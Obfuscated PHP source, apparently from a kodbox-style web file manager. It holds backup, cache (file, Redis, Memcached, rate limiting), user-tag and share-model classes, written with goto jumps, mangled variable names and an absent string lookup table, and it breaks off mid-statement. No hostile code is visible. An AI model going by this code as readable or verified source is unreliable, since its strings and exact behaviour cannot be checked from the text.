<?php
 goto DÖ‹¤ö÷ƒá; eÙóÒôò»•: class BackupFile { public function __construct() { } public function index() { $ğ´ÒÓÛˆ = Backup::get(); $üÚÑã«é = $ğ´ÒÓÛˆ[$_SERVER[ŒÅŸ‹ä†][852]][$_SERVER[ŒÅŸ‹ä†][241]][$_SERVER[ŒÅŸ‹ä†][562]]; $¿›Ù½¥ = array($_SERVER[ŒÅŸ‹ä†][563] => array($_SERVER[ŒÅŸ‹ä†][911], $üÚÑã«é), $_SERVER[ŒÅŸ‹ä†][912] => array($_SERVER[ŒÅŸ‹ä†][416], $ğ´ÒÓÛˆ[$_SERVER[ŒÅŸ‹ä†][848]])); $„äÔÁÜ = (int) Model($_SERVER[ŒÅŸ‹ä†][890])->where($¿›Ù½¥)->count($_SERVER[ŒÅŸ‹ä†][562]); $ÕŠˆïÍÛ = (int) Model($_SERVER[ŒÅŸ‹ä†][890])->where($¿›Ù½¥)->sum($_SERVER[ŒÅŸ‹ä†][89]); $ÒÌºÂ³ = new TaskFileTransfer($_SERVER[ŒÅŸ‹ä†][913], $_SERVER[ŒÅŸ‹ä†][876], $„äÔÁÜ, LNG($_SERVER[ŒÅŸ‹ä†][885]) . $_SERVER[ŒÅŸ‹ä†][886] . LNG($_SERVER[ŒÅŸ‹ä†][914])); $ÒÌºÂ³->task[$_SERVER[ŒÅŸ‹ä†][860]] = $ÕŠˆïÍÛ; $‹ü¹Öü = array($_SERVER[ŒÅŸ‹ä†][915] => $„äÔÁÜ, $_SERVER[ŒÅŸ‹ä†][916] => $ÕŠˆïÍÛ, $_SERVER[ŒÅŸ‹ä†][917] => time()); Backup::set($‹ü¹Öü); $“óßŸÎ¨ = !0; $ôµµ¬Ëø = $this->storeIds(); $™İø×Î = 1; $×Ë‹áĞ = 1000; $ûÚ“Ò”û = $Ö¶ƒ·¶’ = 0; $ÒÅıµë€ = array(); $‰œ‡Š´Ê = $°–‘şÎÛ = 0; do { $ã§í¡†æ = $_SERVER[ŒÅŸ‹ä†][918]; $÷¹¬—³ = Model($_SERVER[ŒÅŸ‹ä†][890])->where($¿›Ù½¥)->field($ã§í¡†æ)->order($_SERVER[ŒÅŸ‹ä†][919])->selectPage($×Ë‹áĞ, $™İø×Î); $ ÄñªØ = !empty($÷¹¬—³[$_SERVER[ŒÅŸ‹ä†][455]]) ? $÷¹¬—³[$_SERVER[ŒÅŸ‹ä†][455]] : array(); foreach ($ ÄñªØ as $Ã”êÚ£) { if (!$this->_fileExist($Ã”êÚ£, $ÒÅıµë€, $ôµµ¬Ëø)) { Backup::log($_SERVER[ŒÅŸ‹ä†][920] . $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][562]] . $_SERVER[ŒÅŸ‹ä†][921] . $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][97]]); continue; } $¦õñÃ÷ = $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][97]]; $€ŸÑ¬–æ = "\173\x69\x6f\72{$ğ´ÒÓÛˆ[$_SERVER[ŒÅŸ‹ä†][848]]}\175" . substr($¦õñÃ÷, strlen("\173\x69\x6f\72{$Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][922]]}\175")); if (IO::exist($€ŸÑ¬–æ)) { $ÒÌºÂ³->updateFileEnd($Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][42]], $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][89]]); } else { $€ŸÑ¬–æ = get_path_father($€ŸÑ¬–æ); IO::mkdir($€ŸÑ¬–æ); if (!IO::copy($¦õñÃ÷, $€ŸÑ¬–æ, $_SERVER[ŒÅŸ‹ä†][923])) { Backup::log($_SERVER[ŒÅŸ‹ä†][924] . $¦õñÃ÷ . $_SERVER[ŒÅŸ‹ä†][908] . $€ŸÑ¬–æ . $_SERVER[ŒÅŸ‹ä†][186]); $“óßŸÎ¨ = !1; break; } } $üÚÑã«é = $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][562]]; $Ö¶ƒ·¶’ += 1; $ûÚ“Ò”û += $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][89]]; $°–‘şÎÛ += 1; $‰œ‡Š´Ê += $Ã”êÚ£[$_SERVER[ŒÅŸ‹ä†][89]]; if ($ûÚ“Ò”û >= 1024 * 1024 * 100) { $‹ü¹Öü = array($_SERVER[ŒÅŸ‹ä†][847] => $üÚÑã«é, $_SERVER[ŒÅŸ‹ä†][925] => $°–‘şÎÛ, $_SERVER[ŒÅŸ‹ä†][926] => $‰œ‡Š´Ê); Backup::set($‹ü¹Öü); $ûÚ“Ò”û = $Ö¶ƒ·¶’ = 0; } } $ ¢›œÉâ = count($ ÄñªØ); $™İø×Î++; } while ($ ¢›œÉâ == $×Ë‹áĞ); $ÒÌºÂ³->end(); $‹ü¹Öü = array($_SERVER[ŒÅŸ‹ä†][927] => 1, $_SERVER[ŒÅŸ‹ä†][858] => time(), $_SERVER[ŒÅŸ‹ä†][874] => 1, $_SERVER[ŒÅŸ‹ä†][847] => $üÚÑã«é, $_SERVER[ŒÅŸ‹ä†][928] => time()); if ($Ö¶ƒ·¶’) { $‹ü¹Öü[$_SERVER[ŒÅŸ‹ä†][925]] = $°–‘şÎÛ; $‹ü¹Öü[$_SERVER[ŒÅŸ‹ä†][926]] = $‰œ‡Š´Ê; } Backup::set($‹ü¹Öü); return !0; } private function _fileExist($”²Ï×§é, &$É°„İÒ½, $Ù¢»×§«) { $£™½ğ÷ =& $_SERVER[ŒÅŸ‹ä†]; $¸³ı¨³¼ = $”²Ï×§é[$£™½ğ÷[97]]; if (in_array($”²Ï×§é[$£™½ğ÷[562]], $É°„İÒ½)) { return !1; } if (!in_array($”²Ï×§é[$£™½ğ÷[922]], $Ù¢»×§«)) { return !1; } if (IO::exist($¸³ı¨³¼)) { return !0; } $ïÏ—ü°ø = get_path_father($¸³ı¨³¼); if (IO::exist($ïÏ—ü°ø)) { $É°„İÒ½[] = $”²Ï×§é[$£™½ğ÷[562]]; return !1; } $Éğ·øáÇ = array($£™½ğ÷[922] => $”²Ï×§é[$£™½ğ÷[922]], $£™½ğ÷[97] => array($£™½ğ÷[479], "{$ïÏ—ü°ø}\x25")); $ÉïØ¤ = Model($£™½ğ÷[890])->where($Éğ·øáÇ)->field($£™½ğ÷[563])->select(); $É°„İÒ½ = array_merge($É°„İÒ½, array_to_keyvalue($ÉïØ¤, $£™½ğ÷[12], $£™½ğ÷[562])); return !1; } private function _fileFilter($»ÎÊ¶Ä) { $ÛºÛê¹ç =& $_SERVER[ŒÅŸ‹ä†]; return; if (empty($»ÎÊ¶Ä)) { return; } $¼µ¨œóº = array($ÛºÛê¹ç[562] => array($ÛºÛê¹ç[7], array_unique($»ÎÊ¶Ä))); $Ÿ’éİé˜ = Model($ÛºÛê¹ç[929])->where($¼µ¨œóº)->field($ÛºÛê¹ç[202])->select(); foreach ($Ÿ’éİé˜ as $¾¶şêÍ ) { Model($ÛºÛê¹ç[929])->remove($¾¶şêÍ [$ÛºÛê¹ç[202]], !1); } } private function storeIds() { $¼ğà‚™˜ =& $_SERVER[ŒÅŸ‹ä†]; $Ğº€¡çù = Model($¼ğà‚™˜[864])->listData(); $ğ«²õ½â = array(); $“Û†Œ = $GLOBALS[$¼ğà‚™˜[6]][$¼ğà‚™˜[102]][$¼ğà‚™˜[930]]; foreach ($Ğº€¡çù as $µ¼¶ì•½) { $£¸¶…¬ü = strtolower($µ¼¶ì•½[$¼ğà‚™˜[106]]); if (!isset($“Û†Œ[$£¸¶…¬ü])) { continue; } $ŠÈ¡¡Œ = $¼ğà‚™˜[87] . (isset($“Û†Œ[$£¸¶…¬ü]) ? $“Û†Œ[$£¸¶…¬ü] : ucfirst($£¸¶…¬ü)); if (!class_exists($ŠÈ¡¡Œ)) { continue; } $ğ«²õ½â[] = $µ¼¶ì•½[$¼ğà‚™˜[492]]; } return $ğ«²õ½â; } } class Cache { protected static $handle; protected static $memoryCache; protected static $runTimeCache; public static function init() { $â¹ıË± =& $_SERVER[ŒÅŸ‹ä†]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); self::$runTimeCache = array(); $İ‹ë«ó = $GLOBALS[$â¹ıË±[6]][$â¹ıË±[434]]; $§—¤÷³ú = $İ‹ë«ó[$İ‹ë«ó[$â¹ıË±[931]]]; $Ò×„’‘Ï = $İ‹ë«ó[$â¹ıË±[932]]; switch ($İ‹ë«ó[$â¹ıË±[931]]) { case $â¹ıË±[31]: self::$handle = Model($â¹ıË±[933]); break; case $â¹ıË±[934]: self::$handle = new CacheRedis($§—¤÷³ú, $Ò×„’‘Ï); break; case $â¹ıË±[935]: self::$handle = new CacheMemcached($§—¤÷³ú, $Ò×„’‘Ï); break; case $â¹ıË±[241]: self::$handle = new CacheFile($§—¤÷³ú, $Ò×„’‘Ï); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($öÖ’—”†) { if (is_array($öÖ’—”†) || is_object($öÖ’—”†)) { $öÖ’—”† = json_encode($öÖ’—”†); } $öÖ’—”† = rawurlencode($öÖ’—”†); return md5(KOD_SITE_ID . $_SERVER[ŒÅŸ‹ä†][11] . $öÖ’—”†); } public static function get($ÑÀğå®Ô, $ÂşêäÚ½ = false) { $©ŞüßÈú = self::key($ÑÀğå®Ô); $§”ï¥í„ = self::init(); if ($ÂşêäÚ½) { return unserialize($§”ï¥í„->get($©ŞüßÈú)); } if (!isset(self::$memoryCache[$©ŞüßÈú])) { $ıÜ–€®ù = $§”ï¥í„->get($©ŞüßÈú); self::$memoryCache[$©ŞüßÈú] = unserialize($ıÜ–€®ù); } return self::$memoryCache[$©ŞüßÈú]; } public static function set($û„’òÌˆ, $è€³ê‹Å, $È¸­Ê›… = false) { $àÄÛŸ»š =& $_SERVER[ŒÅŸ‹ä†]; $™şĞÌÂ´ = self::key($û„’òÌˆ); if (isset(self::$memoryCache[$™şĞÌÂ´]) && self::$memoryCache[$™şĞÌÂ´] === $è€³ê‹Å) { return !0; } if ($È¸­Ê›… === 0) { self::$memoryCache[$™şĞÌÂ´] = $è€³ê‹Å; return !0; } $à¤åüãÕ = self::init(); $İãÎì›« = serialize($è€³ê‹Å); CacheLock::lock($û„’òÌˆ . $àÄÛŸ»š[936]); $ÖÑ¤áşï = $à¤åüãÕ->set($™şĞÌÂ´, $İãÎì›«, $È¸­Ê›…); self::$memoryCache[$™şĞÌÂ´] = $è€³ê‹Å; CacheLock::unlock($û„’òÌˆ . $àÄÛŸ»š[936]); return $ÖÑ¤áşï; } public static function getCall($Œ–Şˆ ‚, $ó€Î­¸æ, $…Î¯‹ç, $ÅÌµ›© = array()) { $ÃŠó½Á =& $_SERVER[ŒÅŸ‹ä†]; $„ıœËŞØ = self::get($Œ–Şˆ ‚); if ($„ıœËŞØ || $„ıœËŞØ === $ÃŠó½Á[12]) { return $„ıœËŞØ; } $„ıœËŞØ = call_user_func_array($…Î¯‹ç, $ÅÌµ›©); $„ıœËŞØ = $„ıœËŞØ ? $„ıœËŞØ : $ÃŠó½Á[12]; self::set($Œ–Şˆ ‚, $„ıœËŞØ, $ó€Î­¸æ); return $„ıœËŞØ; } public static function limitCall($¯Ÿ÷şøä, $ƒŞû”Ïø = 15, $…³ĞÚøù = 30, $Ò„‰—ü£ = true) { $ÇÃ¦ŒĞÚ =& $_SERVER[ŒÅŸ‹ä†]; static $Ôùşù„ø = array(); if ($Ò„‰—ü£) { $¯Ÿ÷şøä = $¯Ÿ÷şøä . $ÇÃ¦ŒĞÚ[937] . KodUser::id() . $ÇÃ¦ŒĞÚ[938] . get_client_ip(); } if (isset($Ôùşù„ø[$¯Ÿ÷şøä]) && is_array($Ôùşù„ø[$¯Ÿ÷şøä])) { return $Ôùşù„ø[$¯Ÿ÷şøä][$ÇÃ¦ŒĞÚ[342]] <= $…³ĞÚøù; } $œ’ÑÓ°‚ = self::get($¯Ÿ÷şøä); if (!is_array($œ’ÑÓ°‚) || time() - $œ’ÑÓ°‚[$ÇÃ¦ŒĞÚ[215]] > $ƒŞû”Ïø) { $œ’ÑÓ°‚ = array($ÇÃ¦ŒĞÚ[215] => time(), $ÇÃ¦ŒĞÚ[342] => 0); } $œ’ÑÓ°‚[$ÇÃ¦ŒĞÚ[342]]++; self::set($¯Ÿ÷şøä, $œ’ÑÓ°‚, $ƒŞû”Ïø); $Ôùşù„ø[$¯Ÿ÷şøä] = $œ’ÑÓ°‚; return $œ’ÑÓ°‚[$ÇÃ¦ŒĞÚ[342]] <= $…³ĞÚøù; } public static function limitRuntime($‚şş£²², $˜›ğ“èÄ) { $‚™‘¨‘ú = $_SERVER[ŒÅŸ‹ä†][939] . $‚şş£²²; if (isset(self::$runTimeCache[$‚™‘¨‘ú]) || !$˜›ğ“èÄ) { return !0; } $·Å‚‚Ùñ = intval(self::get($‚™‘¨‘ú)); $·Å‚‚Ùñ = !$·Å‚‚Ùñ || $·Å‚‚Ùñ <= 0 ? 1 : $·Å‚‚Ùñ + 1; if ($·Å‚‚Ùñ > $˜›ğ“èÄ) { return !1; } self::$runTimeCache[$‚™‘¨‘ú] = !0; self::set($‚™‘¨‘ú, $·Å‚‚Ùñ, 3600); return !0; } public static function limitRuntimeClear() { if (!self::$runTimeCache) { return; } foreach (self::$runTimeCache as $³»ñÎï€ => $Íö§¶) { $š½ÄÌ•Ê = intval(self::get($³»ñÎï€)); $š½ÄÌ•Ê = !$š½ÄÌ•Ê || $š½ÄÌ•Ê <= 1 ? 0 : $š½ÄÌ•Ê - 1; self::set($³»ñÎï€, $š½ÄÌ•Ê, 3600); } self::$runTimeCache = array(); } public static function remove($´«‚§êÖ) { $úêÙ¢ÚÅ = self::key($´«‚§êÖ); unset(self::$memoryCache[$úêÙ¢ÚÅ]); self::clearTimeout(); CacheLock::lock($´«‚§êÖ); $ö£Œé¶ = self::init()->remove($úêÙ¢ÚÅ); CacheLock::unlock($´«‚§êÖ); return $ö£Œé¶; } public static function removeMemory($áéã Áô) { $°òß½Ö = self::key($áéã Áô); unset(self::$memoryCache[$°òß½Ö]); } public static function clearMemory($å¬®Î”ğ = false) { if ($å¬®Î”ğ) { $å¬®Î”ğ = self::key($å¬®Î”ğ); unset(self::$memoryCache[$å¬®Î”ğ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ŒÅŸ‹ä†][940])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ŒÅŸ‹ä†][941])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($­–¯šùù, $ÑäÚš˜) { $äó˜ÔŞæ =& $_SERVER[ŒÅŸ‹ä†]; $this->cachePath = $­–¯šùù[$äó˜ÔŞæ[97]]; $this->prefix = $äó˜ÔŞæ[942]; $this->cacheTime = $ÑäÚš˜; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($¨·Ù·›) { $Öï†Ïğè =& $_SERVER[ŒÅŸ‹ä†]; $¨·Ù·› = str_replace(array($Öï†Ïğè[943], $Öï†Ïğè[108], $Öï†Ïğè[86]), $Öï†Ïğè[944], $¨·Ù·›); return $this->cachePath . $Öï†Ïğè[945] . $¨·Ù·› . $Öï†Ïğè[946]; } public function set($ü¬¨Ø°‘, $¥Ôª¸óˆ, $úçŞ¶şç = false) { $úçŞ¶şç = $úçŞ¶şç ? $úçŞ¶şç : $this->cacheTime; $Øò…ÖØª = $this->getFile($ü¬¨Ø°‘); if (file_put_contents($Øò…ÖØª, $this->prefix . $¥Ôª¸óˆ, LOCK_EX)) { @touch($Øò…ÖØª, intval(time() + $úçŞ¶şç)); clearstatcache(); return !0; } @unlink($Øò…ÖØª); return !1; } public function get($ºıû«Õ˜) { $ü½‘Ù› = $this->getFile($ºıû«Õ˜); if (file_exists($ü½‘Ù›) && filemtime($ü½‘Ù›) < time()) { @unlink($ü½‘Ù›); return !1; } $´å¯Í‹é = @file_get_contents($ü½‘Ù›); return substr($´å¯Í‹é, strlen($this->prefix)); } public function remove($Ï·Õã›¹) { $ëÖ•«µ = $this->getFile($Ï·Õã›¹); return @unlink($ëÖ•«µ); } public function deleteAll() { $œÁı¢Ìî =& $_SERVER[ŒÅŸ‹ä†]; $–ı¿Úİ = scandir($this->cachePath); foreach ($–ı¿Úİ as $œÜ¼í¶») { $­ØÖ©ûé = $this->cachePath . $œÜ¼í¶»; if (strpos($­ØÖ©ûé, $œÁı¢Ìî[946]) && strpos($­ØÖ©ûé, $œÁı¢Ìî[947])) { @unlink($­ØÖ©ûé); } } } public function clearTimeout() { $Ú•€Öß =& $_SERVER[ŒÅŸ‹ä†]; $Ö‰şĞ¼ = scandir($this->cachePath); foreach ($Ö‰şĞ¼ as $İÓ²©ä) { $ÍÖ¸è¹‡ = $this->cachePath . $İÓ²©ä; if (strpos($ÍÖ¸è¹‡, $Ú•€Öß[946]) && strpos($ÍÖ¸è¹‡, $Ú•€Öß[947]) && filemtime($ÍÖ¸è¹‡) < time()) { @unlink($ÍÖ¸è¹‡); } } } } goto Cäİóí‚„Ù; dŸÏÑôË­É: class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\145\x72\56\164\141\x67\114\x69\x73\x74"; public $modelType = "\x55\163\x65\x72\117\x70\164\151\x6f\x6e"; public $field = array("\x6e\141\155\145", "\x73\164\171\x6c\145", "\163\x6f\162\164"); public function listData($ïè¿àç = false, $´ ë‹Å› = "\x73\x6f\x72\164", $“Ø¡ä›ï = false) { return parent::listData($ïè¿àç, $´ ë‹Å›, $“Ø¡ä›ï); } public function remove($®˜ùÎµ) { return parent::remove($®˜ùÎµ); } public function add($ÎÍŸ’—Æ, $±›¢Á· = "\x6c\141\x62\x65\154\55\x67\x72\145\x79\x2d\156\157\162\x6d\141\154") { $ÃÂˆ—Ç™ =& $_SERVER[ŒÅŸ‹ä†]; if ($this->findByName($ÎÍŸ’—Æ)) { return !1; } $ Áï¾ı£ = array($ÃÂˆ—Ç™[514] => $ÎÍŸ’—Æ, $ÃÂˆ—Ç™[579] => $±›¢Á·, $ÃÂˆ—Ç™[2130] => $this->getSort($ÃÂˆ—Ç™[345]) + 1); return parent::insert($ Áï¾ı£); } public function update($±‰Û–÷ƒ, $¦Ñİ„¥) { $·Ã¦å¼¶ =& $_SERVER[ŒÅŸ‹ä†]; $‚¨ë­°£ = $this->listData($±‰Û–÷ƒ); $×Ø´æ¹ = $this->findByName($¦Ñİ„¥[$·Ã¦å¼¶[42]]); if (!$‚¨ë­°£ || $×Ø´æ¹ && $×Ø´æ¹[$·Ã¦å¼¶[492]] != $‚¨ë­°£[$·Ã¦å¼¶[492]]) { return !1; } return parent::update($±‰Û–÷ƒ, $¦Ñİ„¥); } public function moveTop($Í¦±£À¸) { $â•Ö‘°õ =& $_SERVER[ŒÅŸ‹ä†]; $Éì…ÁÒ½ = parent::listData(); $¶Şª‚Ê = $this->getSort($â•Ö‘°õ[344]); foreach ($Éì…ÁÒ½ as &$á¯½˜¨•) { if ($á¯½˜¨•[$â•Ö‘°õ[492]] == $Í¦±£À¸) { $á¯½˜¨•[$â•Ö‘°õ[2148]] = $¶Şª‚Ê; continue; } $á¯½˜¨•[$â•Ö‘°õ[2148]] += 1; } unset($á¯½˜¨•); return parent::resetData($Éì…ÁÒ½); } public function moveBottom($è•­Ğò) { $§µÊ€³Å =& $_SERVER[ŒÅŸ‹ä†]; $Øñ«¤¾Ù = $this->getSort($§µÊ€³Å[345]) + 1; return parent::update($è•­Ğò, array($§µÊ€³Å[2148] => $Øñ«¤¾Ù)); } public function resetSort($ ë­øª) { $äÒİ˜× =& $_SERVER[ŒÅŸ‹ä†]; $ÕóƒŒ³ƒ = array(); $ ë­øª = is_array($ ë­øª) ? $ ë­øª : array(); for ($ Ÿ¦¸şı = 0; $ Ÿ¦¸şı < count($ ë­øª); $ Ÿ¦¸şı++) { $ÕóƒŒ³ƒ[$ ë­øª[$ Ÿ¦¸şı] . $äÒİ˜×[12]] = $ Ÿ¦¸şı + 1; } $¸Î«¥³ü = parent::listData(); foreach ($¸Î«¥³ü as &$ú§¤¾ÀÏ) { $Æê°Øñ» = $ÕóƒŒ³ƒ[$ú§¤¾ÀÏ[$äÒİ˜×[492]]]; $ú§¤¾ÀÏ[$äÒİ˜×[2148]] = $Æê°Øñ» ? $Æê°Øñ» : $ú§¤¾ÀÏ[$äÒİ˜×[2148]]; } unset($ú§¤¾ÀÏ); return parent::resetData($¸Î«¥³ü); } private function getSort($±êÜå£) { $œÕçâ» =& $_SERVER[ŒÅŸ‹ä†]; $®ÅÁ—öÚ = parent::listData(); $øç¸¼‘ = array_to_keyvalue($®ÅÁ—öÚ, $œÕçâ»[12], $œÕçâ»[2148]); if (!$øç¸¼‘) { $øç¸¼‘ = array(0); } $¥úÚ‘ÃÖ = $±êÜå£ == $œÕçâ»[345] ? max($øç¸¼‘) : min($øç¸¼‘); return intval($¥úÚ‘ÃÖ); } } goto e÷Şàí¹½Ã; AÑÌ´ƒ”á: class ShareModel extends ModelBase { protected $tableName = "\163\150\x61\162\x65"; protected $dataAuto = array(array("\155\157\x64\151\x66\x79\124\151\155\x65", "\164\151\155\145", "\x69\x6e\163\145\162\164\x2c\x75\x70\x64\x61\164\145", "\146\x75\x6e\143\164\x69\x6f\156"), array("\x63\x72\145\x61\164\145\x54\x69\155\x65", "\164\x69\x6d\x65", "\x69\156\x73\145\162\164", "\146\x75\156\143\164\151\x6f\x6e"), array("\x6f\x70\164\151\x6f\x6e\x73", '', "\151\156\x73\145\162\x74\54\165\x70\x64\141\164\145\54\x73\145\154\x65\x63\x74", "\x6a\x73\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($´ƒ÷¥„‰) { $ªªüğ–æ =& $_SERVER[ŒÅŸ‹ä†]; return array($ªªüğ–æ[2265] => array(USER_ID, $ªªüğ–æ[2266]), $ªªüğ–æ[2267] => array($´ƒ÷¥„‰[0], $ªªüğ–æ[2268])); } protected function ___listSimple() { $æßÓÂ›Ï = $this->field($this->fieldList)->where(array($_SERVER[ŒÅŸ‹ä†][1537] => USER_ID))->select(); return $æßÓÂ›Ï ? $æßÓÂ›Ï : array(); } protected function ___getInfoShare($ïŸ…÷¦ô) { return $this->_getShareInfo(array($_SERVER[ŒÅŸ‹ä†][693] => $ïŸ…÷¦ô), !1); } protected function getInfo($õœßÅ„º) { $²¨‡ºİç = $this->getInfoShare($õœßÅ„º); return $this->shareSourceInfo($²¨‡ºİç); } public function getInfoByHash($¬ı’ƒ‚¬) { return $this->_getShareInfo(array($_SERVER[ŒÅŸ‹ä†][1499] => $¬ı’ƒ‚¬)); } public function getInfoByPath($¸¡Ç¶å°) { $êº©É¸ =& $_SERVER[ŒÅŸ‹ä†]; $ë¡˜ƒ = array($êº©É¸[1537] => USER_ID, $êº©É¸[202] => $¸¡Ç¶å°); return $this->_getShareInfo($ë¡˜ƒ); } public function getInfoBySourcePath($ú®œ²õç) { $·åİÅŞ =& $_SERVER[ŒÅŸ‹ä†]; $ºİŸÉÀÀ = array($·åİÅŞ[1537] => USER_ID, $·åİÅŞ[588] => $ú®œ²õç); return $this->_getShareInfo($ºİŸÉÀÀ); } private function _getShareInfo($İ˜üüóÖ, $ËºÙëÇ¦ = true) { $ÙËÃŠ–Í =& $_SERVER[ŒÅŸ‹ä†]; $¿±úàå = $this->where($İ˜üüóÖ)->find(); if (!$¿±úàå) { return !1; } if (!is_array($¿±úàå[$ÙËÃŠ–Í[585]])) { $¿±úàå[$ÙËÃŠ–Í[585]] = array(); } $İ˜üüóÖ = array($ÙËÃŠ–Í[693] => $¿±úàå[$ÙËÃŠ–Í[693]]); $¦¡åØ¦¬ = $ÙËÃŠ–Í[2269]; $¿±úàå[$ÙËÃŠ–Í[1495]] = Model($ÙËÃŠ–Í[694])->order($ÙËÃŠ–Í[492])->field($¦¡åØ¦¬)->where($İ˜üüóÖ)->select(); if (!$ËºÙëÇ¦) { return $¿±úàå; } return $this->shareSourceInfo($¿±úàå); } private function shareSourceInfo($Šµåæµ°) { $îœÂ¿ë÷ =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($Šµåæµ°)) { return $Šµåæµ°; } if ($Šµåæµ°[$îœÂ¿ë÷[202]] == $îœÂ¿ë÷[239]) { $Šµåæµ°[$îœÂ¿ë÷[100]] = IO::info($Šµåæµ°[$îœÂ¿ë÷[588]]); } else { $Šµåæµ°[$îœÂ¿ë÷[100]] = Model($îœÂ¿ë÷[1477])->pathInfo($Šµåæµ°[$îœÂ¿ë÷[202]]); } return $Šµåæµ°; } protected function getInfoAuth($á°±Õê) { $ø¦ëÈÁê =& $_SERVER[ŒÅŸ‹ä†]; $¾Üİ¸©Í = $this->getInfo($á°±Õê); if ($¾Üİ¸©Í[$ø¦ëÈÁê[1537]] == USER_ID) { $¾Üİ¸©Í[$ø¦ëÈÁê[507]] = $¾Üİ¸©Í[$ø¦ëÈÁê[100]][$ø¦ëÈÁê[507]]; } else { $¾Üİ¸©Í[$ø¦ëÈÁê[507]] = Model($ø¦ëÈÁê[592])->authMake($¾Üİ¸©Í[$ø¦ëÈÁê[1495]]); } return $¾Üİ¸©Í; } protected function listData($¸›ğ‹éÀ = null, $€Œ–ò = 300) { $ŞÇ®†ŸŸ =& $_SERVER[ŒÅŸ‹ä†]; $¥’äû²ş = array(array($ŞÇ®†ŸŸ[583] => array($ŞÇ®†ŸŸ[1123], 0), $ŞÇ®†ŸŸ[691] => array($ŞÇ®†ŸŸ[1123], 0), $ŞÇ®†ŸŸ[2270] => $ŞÇ®†ŸŸ[2226])); if ($¸›ğ‹éÀ == $ŞÇ®†ŸŸ[2271]) { $¥’äû²ş = array($ŞÇ®†ŸŸ[583] => 1); } else { if ($¸›ğ‹éÀ == $ŞÇ®†ŸŸ[1288]) { $¥’äû²ş = array($ŞÇ®†ŸŸ[691] => 1); } } $¥’äû²ş[$ŞÇ®†ŸŸ[1537]] = USER_ID; $ù¸Ã¶ó‚ = $this->where($¥’äû²ş)->selectPage($€Œ–ò); return $ù¸Ã¶ó‚; } protected function listToMe($±áûŠ ğ = 300) { $…Ş—Û»° =& $_SERVER[ŒÅŸ‹ä†]; $Öµ§åï = Model($…Ş—Û»°[2272])->userGroupParents(USER_ID); $¨ã‰ñ€  = array($…Ş—Û»°[676] => SourceModel::TYPE_USER, $…Ş—Û»°[594] => USER_ID); if ($Öµ§åï) { $¨ã‰ñ€  = array(array($…Ş—Û»°[676] => SourceModel::TYPE_USER, $…Ş—Û»°[594] => USER_ID), array($…Ş—Û»°[676] => SourceModel::TYPE_GROUP, $…Ş—Û»°[594] => array($…Ş—Û»°[7], $Öµ§åï)), $…Ş—Û»°[2270] => $…Ş—Û»°[2226]); } $°ËÓšıÎ = Model($…Ş—Û»°[694])->where($¨ã‰ñ€ )->selectPage($±áûŠ ğ); $ÔãäÍ¡ = array_to_keyvalue_group($°ËÓšıÎ[$…Ş—Û»°[455]], $…Ş—Û»°[693]); if (!$ÔãäÍ¡) { return $°ËÓšıÎ; } $ÌŸ÷€ = $…Ş—Û»°[2273]; $¨ã‰ñ€  = array($…Ş—Û»°[693] => array($…Ş—Û»°[512], array_keys($ÔãäÍ¡))); $¦¯Æå = $this->field($ÌŸ÷€)->where($¨ã‰ñ€ )->select(); foreach ($¦¯Æå as $¶Ş¨˜ªş => &$Î˜áŸóÂ) { $Î˜áŸóÂ[$…Ş—Û»°[1495]] = $ÔãäÍ¡[$Î˜áŸóÂ[$…Ş—Û»°[693]]]; } unset($Î˜áŸóÂ); $¼ŸÌ˜±¶ = array($…Ş—Û»°[2274] => $¦¯Æå, $…Ş—Û»°[2275] => $°ËÓšıÎ[$…Ş—Û»°[452]]); return $¼ŸÌ˜±¶; } protected function shareAdd($Íì†Æ¿ª, $ø»‡ËÓ) { $¨¥„•ˆÖ =& $_SERVER[ŒÅŸ‹ä†]; $¨á¬—° = $this->_addShareData($Íì†Æ¿ª, $ø»‡ËÓ); if (!empty($ø»‡ËÓ[$¨¥„•ˆÖ[2276]])) { $this->_shareAuthSet($¨á¬—°, $ø»‡ËÓ[$¨¥„•ˆÖ[2276]]); } $this->shareEventAdd($Íì†Æ¿ª, $ø»‡ËÓ, $¨¥„•ˆÖ[2277]); return $¨á¬—°; } protected function shareAddSystem($òÍÒ¨àĞ, $´’ğ…©ç) { $á˜ÂÍµ =& $_SERVER[ŒÅŸ‹ä†]; $èÈÀÒÙ = $this->_addShareData($òÍÒ¨àĞ, $´’ğ…©ç, $á˜ÂÍµ[200]); $this->_shareAuthSet($èÈÀÒÙ, $´’ğ…©ç[$á˜ÂÍµ[2276]]); return $èÈÀÒÙ; } private function shareEventAdd($±ÚÓÒÚ, $²îµÆºÀ, $î·õ°Ø = "\141\144\144") { $Ş‰ë«íº =& $_SERVER[ŒÅŸ‹ä†]; if (!$±ÚÓÒÚ || $±ÚÓÒÚ == $Ş‰ë«íº[239]) { return; } if ($î·õ°Ø == $Ş‰ë«íº[2277]) { if ($²îµÆºÀ[$Ş‰ë«íº[583]] == $Ş‰ë«íº[101]) { Model($Ş‰ë«íº[661])->eventShare($±ÚÓÒÚ, $Ş‰ë«íº[2278]); } if ($²îµÆºÀ[$Ş‰ë«íº[691]] == $Ş‰ë«íº[101]) { Model($Ş‰ë«íº[661])->eventShare($±ÚÓÒÚ, $Ş‰ë«íº[2279]); } return; } $Õ¥±áÕƒ = $this->getInfoByPath($±ÚÓÒÚ); $Á÷•Ê = $Ş‰ë«íº[2280]; if ($Õ¥±áÕƒ[$Ş‰ë«íº[583]] == $Ş‰ë«íº[239] && $²îµÆºÀ[$Ş‰ë«íº[583]] == 